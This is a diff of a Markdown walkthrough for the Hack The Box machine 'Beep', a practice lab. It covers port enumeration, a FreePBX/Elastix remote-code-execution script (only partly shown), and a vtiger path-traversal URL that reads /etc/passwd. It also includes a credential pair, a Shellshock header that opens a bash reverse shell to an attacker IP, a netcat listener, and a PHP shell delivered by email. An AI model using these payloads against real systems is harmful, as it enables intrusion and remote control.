@@ -3,14 +3,17 @@
 # Initial Enumeration
 
 **1. nmap -sC -sV 10.10.10.7**
+
 ![b1](https://user-images.githubusercontent.com/15195048/93913785-6e211580-fcba-11ea-93d2-58d3c0990444.png)
 
 **2. ./nmapAutomator 10.10.10.7 All**
+
 ![b2](https://user-images.githubusercontent.com/15195048/93913788-6f524280-fcba-11ea-8e5c-9c03c465480e.png)
 
 
 3. Searchploit
 searchploit FREEpbx, Elastix
+
 ![b3](https://user-images.githubusercontent.com/15195048/93913790-6fead900-fcba-11ea-98d1-53d8796cbb71.png)
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -18,19 +21,22 @@ searchploit FREEpbx, Elastix
 # Port Enumeration
 ## 1. Enumerating Port 111 and 877 Rpcbind service
 These 2 ports are used by rpcbind service. Let’s see if anything interesting by executing the following command:
-rpcinfo -p 10.10.10.7
+**rpcinfo -p 10.10.10.7**
 Nothing here!!
 
 ## 2. Enumerating port 80 & 443
 Visit the URL to port 80 redirects us to port 443 (https) with a login form of Elastix application.
 
-ELASTIX SERVER:
-Notes:
+**ELASTIX SERVER:**
+
+**Notes:**
+
 1. Asterisk is the software that allows you to have to functionality of a pbx with a pc or a server. It does not have a graphical interface and most of the configuration is do editing text files. There are several web interfases for Asterisk and the most popular is freePBX.
 2. Elastix includes freepbx, Asterisk and our modules to administrate Asterisk. We also include other software use for email, chat, fax, etc... that can be use together with Asterisk.
 3. With elastix you can have the pbx ready to configure 20 minutes after the installation.
 4. Anything that runs Linux would be a good place to run Asterisk. Of course it depends how many concurrents calls you are going to have.
-Interesting files 
+
+**Interesting files**
 In elastix version 1.4
 Backup location : /var/lib/asterisk/backups/
 In latest versions
@@ -41,26 +47,25 @@ Backup location : /var/www/backup/
 ![b4](https://user-images.githubusercontent.com/15195048/93913794-70836f80-fcba-11ea-8a48-34a203e94d8d.png)
 
 
-SIP is an application-layer control protocol that can establish, modify, and terminate multimedia sessions (conferences) such as Internet telephony calls. SIP can also invite participants to already existing sessions, such as multicast conferences.
-SIP employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of HTTP, providing a readable text-based format.
+**SIP** is an application-layer control protocol that can establish, modify, and terminate multimedia sessions (conferences) such as Internet telephony calls. SIP can also invite participants to already existing sessions, such as multicast conferences.
+**SIP** employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of HTTP, providing a readable text-based format.
 Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port
-SIP clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up and tearing down voice or video calls.
+**SIP** clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up and tearing down voice or video calls.
 And, a little about Asterisk and FreePBX:
 Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol (VoIP) services.
 FreePBX is an open source GUI that controls and manages Asterisk
 An IP PBX ("Internet Protocol private branch exchange") is a system that connects telephone extensions to the public switched telephone network (PSTN) and provides internal communication for a business
 
-I found an awesome tool suite SIPVicious
+I found an awesome tool suite **SIPVicious**
 
-SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:
-svmap – this is a sip scanner. Lists SIP devices found on an IP range
-svwar – identifies active extensions on a PBX
-svcrack – an online password cracker for SIP PBX
-svreport – manages sessions and exports reports to various formats
-svcrash – attempts to stop unauthorized svwar and svcrack scans
+**SIPVicious suite** is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:
+**svmap** – this is a sip scanner. Lists SIP devices found on an IP range
+**svwar** – identifies active extensions on a PBX
+**svcrack** – an online password cracker for SIP PBX
+**svreport** – manages sessions and exports reports to various formats
+**svcrash** – attempts to stop unauthorized svwar and svcrack scans
 
 ![b5](https://user-images.githubusercontent.com/15195048/93913796-711c0600-fcba-11ea-819e-56d97a0f2e0f.png)
-
 
 **Interesting Files**
 
@@ -68,11 +73,11 @@ https://10.10.10.7/admin/reports.php
 
 https://10.10.10.7/recordings/index.php
 
-Resources:
+**Resources:**
 https://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/
 https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/
 
- FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
+**FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution**
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #!/usr/bin/python
 ############################################################
@@ -183,10 +188,10 @@ r = requests.get(url, proxies=proxies, verify=False)
 
 
 
-Burp Suite
+**Burp Suite**
 
 
-Attacker:
+**Attacker:**
 nc -lvp 8888
 
 
@@ -197,11 +202,11 @@ https://10.10.10.7/vtigercrm/
 
 
 
-vtiger CRM 5.1.0
+**vtiger CRM 5.1.0**
 
 
 
-Path Traversal
+## Path Traversal
 URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
 
 
@@ -209,13 +214,13 @@ URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../.
 
 
 
-Credentials:
+**Credentials:**
 admin:jEhdIekWmdjE
 
-ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1
+**ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1**
 
 
-3. Enumerating port 10000
+## 3. Enumerating port 10000
 
   Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely.
   
@@ -240,7 +245,7 @@ Burp Suite
 () { :; }; bash -i &> /dev/tcp/10.10.14.12/9980 0>&1
 
 
-4. Enumerating port 25 SMTP 
+## 4. Enumerating port 25 SMTP 
 
 I will send a malicious e-mail and got a reverse shell.
 
@@ -252,6 +257,5 @@ We sent a php shell code within the mail. Lets try to execute the payload with L
 /var/mail/asterisk location. 
 We can read with burp suite or curl to execute the php shell.
 
-User: aeff3def0c765c2677b94715cffa73ac 
-Root: d88e006123842106982acce0aaf453f0
-Resource: https://www.hackingarticles.in/hack-the-box-challenge-beep-walkthrough/
+User.txt
+Root.txt
